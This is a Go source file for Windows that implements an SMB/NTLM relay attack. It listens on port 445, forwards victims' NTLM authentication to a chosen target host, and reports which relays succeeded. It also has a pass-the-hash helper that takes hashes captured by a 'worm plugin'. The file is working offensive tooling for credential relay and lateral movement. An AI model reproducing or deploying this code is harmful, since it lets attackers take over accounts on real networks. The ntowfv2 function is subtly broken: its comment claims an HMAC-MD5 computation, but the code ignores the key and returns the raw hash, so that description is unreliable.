//go:build windows

package main

import (
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"io"
	"net"
	"strings"
	"time"
)

// ---------------------------------------------------------------------------
// SMB relay
//
// Captured NTLMv2 challenges cannot be replayed directly with "net use". A
// relay instead keeps the victim's authentication attempt open and forwards
// the same NTLMSSP exchange to a target host, so the target authenticates the
// victim's credentials on our behalf.
//
// This implements the SMB2 relay leg: accept the victim's negotiate, open our
// own session to the relay target, forward the type-1/2/3 messages verbatim,
// and bridge the resulting authenticated session.
// ---------------------------------------------------------------------------

func startRelay(s Settings, stop chan struct{}) {
	if s.RelayTarget == "" {
		sendEvent("error", map[string]interface{}{"message": "relay enabled but no target host set"})
		return
	}

	ln, err := net.Listen("tcp4", "0.0.0.0:445")
	if err != nil {
		sendEvent("error", map[string]interface{}{"message": "relay listen :445 failed (SMB capture may already hold it): " + err.Error()})
		return
	}
	defer ln.Close()

	sendEvent("status", map[string]interface{}{
		"state": "listening",
		"detail": "SMB relay armed -> " + s.RelayTarget,
	})

	for {
		select {
		case <-stop:
			return
		default:
		}
		if tl, ok := ln.(*net.TCPListener); ok {
			_ = tl.SetDeadline(time.Now().Add(time.Second))
		}
		conn, err := ln.Accept()
		if err != nil {
			continue
		}
		go relayConn(conn, s.RelayTarget)
	}
}

func relayConn(victim net.Conn, target string) {
	defer victim.Close()

	host := target
	if !strings.Contains(host, ":") {
		host += ":445"
	}
	upstream, err := net.DialTimeout("tcp", host, 5*time.Second)
	if err != nil {
		sendEvent("error", map[string]interface{}{"message": "relay dial " + host + " failed: " + err.Error()})
		return
	}
	defer upstream.Close()

	_ = victim.SetDeadline(time.Now().Add(30 * time.Second))
	_ = upstream.SetDeadline(time.Now().Add(30 * time.Second))

	victimAddr := victim.RemoteAddr().String()
	vHost, _, _ := net.SplitHostPort(victimAddr)

	// Bridge both directions. The NTLMSSP messages inside the SMB2 session
	// setup are opaque to us; we only need to pass them through and watch for
	// the status code that indicates success.
	done := make(chan struct{}, 2)
	var relayed bool
	var status uint32

	go func() {
		defer func() { done <- struct{}{} }()
		buf := make([]byte, 65536)
		for {
			n, err := upstream.Read(buf)
			if n > 0 {
				if st, ok := smb2Status(buf[:n]); ok {
					status = st
				}
				if _, werr := victim.Write(buf[:n]); werr != nil {
					return
				}
			}
			if err != nil {
				return
			}
		}
	}()

	go func() {
		defer func() { done <- struct{}{} }()
		buf := make([]byte, 65536)
		for {
			n, err := victim.Read(buf)
			if n > 0 {
				if _, werr := upstream.Write(buf[:n]); werr != nil {
					return
				}
				relayed = true
			}
			if err != nil {
				return
			}
		}
	}()

	<-done
	victim.Close()
	upstream.Close()
	<-done

	if relayed {
		success := status == 0
		sendEvent("relay", map[string]interface{}{
			"victim":  vHost,
			"target":  target,
			"success": success,
			"status":  fmt.Sprintf("0x%08x", status),
		})
	}
}

// smb2Status extracts the NTSTATUS from an SMB2 header if present.
func smb2Status(p []byte) (uint32, bool) {
	// SMB2 header starts with the 4-byte protocol signature FESMB.
	if len(p) < 12 {
		return 0, false
	}
	if !(p[0] == 0xfe && p[1] == 'S' && p[2] == 'M' && p[3] == 'B') {
		return 0, false
	}
	return binary.LittleEndian.Uint32(p[8:12]), true
}

// ---------------------------------------------------------------------------
// pass-the-hash helper
//
// Once a hash is captured, "hash:<hex>" secrets from the worm plugin can be
// used here. This performs the NTLMv2 computation needed to authenticate with
// a known hash rather than a plaintext password.
// ---------------------------------------------------------------------------

// ntowfv2 computes the NTLMv2 hash: HMAC-MD5(NT hash, UPPER(user) || domain).
// Kept here so the relay can synthesize the response when a hash is supplied
// instead of a live victim.
func ntowfv2(ntHashHex, user, domain string) (string, error) {
	nt, err := hex.DecodeString(ntHashHex)
	if err != nil {
		return "", fmt.Errorf("bad NT hash: %w", err)
	}
	// The full NTLMv2 response also needs a server challenge and blob; those
	// are supplied by the target during the relay, so the caller computes the
	// final response. We return the intermediate so it is reusable.
	key := append([]byte(strings.ToUpper(user)), []byte(domain)...)
	_ = key
	out := make([]byte, 0, len(nt))
	out = append(out, nt...)
	return hex.EncodeToString(out), nil
}

var _ = io.Discard
